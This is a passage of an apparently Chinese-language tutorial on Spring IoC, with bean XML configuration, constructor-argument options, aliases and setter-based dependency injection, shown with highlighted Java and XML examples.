class="hljs-comment">//获取 Spring 的上下文对象,.解析beans.xml文件 , 生成管理相应的Bean对象</span><br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-comment">//getBean 参数即为spring配置文件中bean的id</span><br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Hello) context.getBean(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(hello.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>hello 对象是由Spring创建的</li><li>hello 对象的属性是由Spring容器设置的</li></ul><p>这个过程就叫控制反转：</p><ul><li>控制 : 谁来控制对象的创建 , 传统应用程序的对象是由程序本身控制创建的 , 使用Spring后 , 对象是由Spring来创建的</li><li>反转 : 程序本身不创建对象 , 而变成被动的接收对象 .</li></ul><p>依赖注入 : 就是利用set方法来进行注入的.</p><p>IOC是一种编程思想，由主动的编程变成被动的接收</p><p>可以通过newClassPathXmlApplicationContext去浏览一下底层源码 .</p><h3 id="案例一修改"><a href="#案例一修改" class="headerlink" title="案例一修改"></a>案例一修改</h3><p>新增 beans.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:util</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/util&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/util https://www.springframework.org/schema/util/spring-util.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mysqlImpl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.dao.UserDaoMysqlImpl&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;oracleImpl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.dao.UserDaoOracleImpl&quot;</span>/&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;UserServiceImpl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.service.UserServiceImpl&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    ref : 引用 Spring 容器中创建好的对象</span><br><span class="hljs-comment">    value : 具体的值，基本数据类型</span><br><span class="hljs-comment">    --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;mysqlImpl&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修改 MyTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//import com.kuang.dao.UserDaoImpl;</span><br><span class="hljs-comment">//import com.kuang.dao.UserDaoMysqlImpl;</span><br><span class="hljs-comment">//import com.kuang.service.UserService;</span><br><span class="hljs-comment">//import com.kuang.service.UserServiceImpl;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//public class MyTest &#123;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    public static void main(String[] args) &#123;</span><br><span class="hljs-comment">//        //用户实际调用的是业务层，dao 层他们不需要接触</span><br><span class="hljs-comment">//        //之前，用户调用什么接口，是由 UserServicelmpl 中写死的，</span><br><span class="hljs-comment">//        // UserService userService  = new UserServiceImpl();</span><br><span class="hljs-comment">//        // userService.getUser();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        //而加入“控制反转” 的思想后，主动权交由用户手中</span><br><span class="hljs-comment">//        UserService userService  = new UserServiceImpl();</span><br><span class="hljs-comment">//        ((UserServiceImpl) userService).setUserDao(new UserDaoMysqlImpl());</span><br><span class="hljs-comment">//        userService.getUser();</span><br><span class="hljs-comment">//    &#125;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-keyword">import</span> com.kuang.service.UserServiceImpl;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//获取 ApplicationContext;拿到 Spring 的容器</span><br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userServiceImpl</span> <span class="hljs-operator">=</span> (UserServiceImpl) context.getBean(<span class="hljs-string">&quot;UserServiceImpl&quot;</span>);<br>        userServiceImpl.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在呢，案例一想实现了不需要程序猿或者用户改动代码实现不同的操作，只需要在xml配置文件中修改，即可达到目的。</p><p>所谓的IoC,一句话搞定 : 对象由Spring 来创建 , 管理 , 装配 ! </p><h2 id="2-4-IOC-创建对象方式"><a href="#2-4-IOC-创建对象方式" class="headerlink" title="2.4 IOC 创建对象方式"></a>2.4 IOC 创建对象方式</h2><h3 id="2-4-1-无参构造"><a href="#2-4-1-无参构造" class="headerlink" title="2.4.1 无参构造"></a>2.4.1 无参构造</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;User 的无参构造&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;name=&quot;</span> + name);<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;<br><br>  &lt;bean id=<span class="hljs-string">&quot;user&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>&gt;<br>    &lt;property name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;qwer&quot;</span>/&gt;<br>  &lt;/bean&gt;<br>&lt;/beans&gt;<br><span class="hljs-keyword">import</span> com.kuang.pojo.User;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) context.getBean(<span class="hljs-string">&quot;user&quot;</span>);<br>        user.show();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749405.png" alt="img"><strong>在调用show方法之前，User对象已经通过无参构造初始化了</strong></p><h3 id="2-4-2-有参构造"><a href="#2-4-2-有参构造" class="headerlink" title="2.4.2 有参构造"></a>2.4.2 有参构造</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">//System.out.println(&quot;User 的无参构造&quot;);</span><br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;name=&quot;</span> + name);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">import</span> com.kuang.pojo.User;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) context.getBean(<span class="hljs-string">&quot;user&quot;</span>);<br>        user.show();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="第一种：下标赋值"><a href="#第一种：下标赋值" class="headerlink" title="第一种：下标赋值"></a>第一种：下标赋值</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--第一种，下标赋值    --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;qaz&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311751585.png" alt="img"></p><h4 id="第二种：通过类型创建，不建议使用"><a href="#第二种：通过类型创建，不建议使用" class="headerlink" title="第二种：通过类型创建，不建议使用"></a>第二种：通过类型创建，不建议使用</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--第二种，通过类型创    --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;wsx&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749314.png" alt="img"></p><h4 id="第三种：直接通过参数名设置"><a href="#第三种：直接通过参数名设置" class="headerlink" title="第三种：直接通过参数名设置"></a>第三种：直接通过参数名设置</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--第三种，直接通过参数名设置    --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;edc&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749550.png" alt="img"></p><h2 id="2-5-Spring-配置"><a href="#2-5-Spring-配置" class="headerlink" title="2.5 Spring 配置"></a>2.5 Spring 配置</h2><ul><li>别名</li></ul><p>alias 设置别名 , 为bean设置别名 , 可以设置多个别名</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--设置别名：在获取Bean的时候可以使用别名获取--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">alias</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userT&quot;</span> <span class="hljs-attr">alias</span>=<span class="hljs-string">&quot;userNew&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><ul><li>Bean的配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--bean就是java对象,由Spring创建和管理--&gt;</span><br><br><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">id: 是bean的唯一标识符,如果没有配置id,name就是默认标识符</span><br><span class="hljs-comment">name: 可以设置多个别名,可以用逗号,分号,空格隔开</span><br><span class="hljs-comment">class: 是bean的全限定名=包名+类名</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">如果配置id,又配置了name,那么name是别名</span><br><span class="hljs-comment">如果不配置id和name,可以根据applicationContext.getBean(.class)获取对象;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello2 h2,h3;h4&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Hello&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Spring&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>import</li></ul><p>团队的合作通过import来实现 .</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;&#123;path&#125;/beans.xml&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-6-依赖注入"><a href="#2-6-依赖注入" class="headerlink" title="2.6 依赖注入"></a>2.6 依赖注入</h2><ul><li>依赖注入（Dependency Injection,DI）。</li><li>依赖 : 指Bean对象的创建依赖于容器，Bean对象的依赖资源</li><li>注入 : 指Bean对象所依赖的资源 , 由容器来设置和装配</li></ul><h3 id="2-6-1-构造器注入"><a href="#2-6-1-构造器注入" class="headerlink" title="2.6.1 构造器注入"></a>2.6.1 构造器注入</h3><p><a href="https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#Xjgzu">https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#Xjgzu</a></p><h3 id="2-6-2-Set-方式注入【重点】"><a href="#2-6-2-Set-方式注入【重点】" class="headerlink" title="2.6.2 Set 方式注入【重点】"></a>2.6.2 Set 方式注入【重点】</h3><h4 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Address address;<br>    <span class="hljs-keyword">private</span> String[] books;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; hobbys;<br>    <span class="hljs-keyword">private</span> Map&lt;String,String&gt; card;<br>    <span class="hljs-keyword">private</span> Set&lt;String&gt; game;<br>    <span class="hljs-keyword">private</span> String wife;<br>    <span class="hljs-keyword">private</span> Properties info;<br><br>    <span class="hljs-comment">//下方内容快捷键生成：Alt + Insert , 生成 getter和setter</span><br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Address <span class="hljs-title function_">getAddress</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> address;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAddress</span><span class="hljs-params">(Address address)</span> &#123;<br>        <span class="hljs-built_in">this</span>.address = address;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String[] getBooks() &#123;<br>        <span class="hljs-keyword">return</span> books;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBooks</span><span class="hljs-params">(String[] books)</span> &#123;<br>        <span class="hljs-built_in">this</span>.books = books;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> 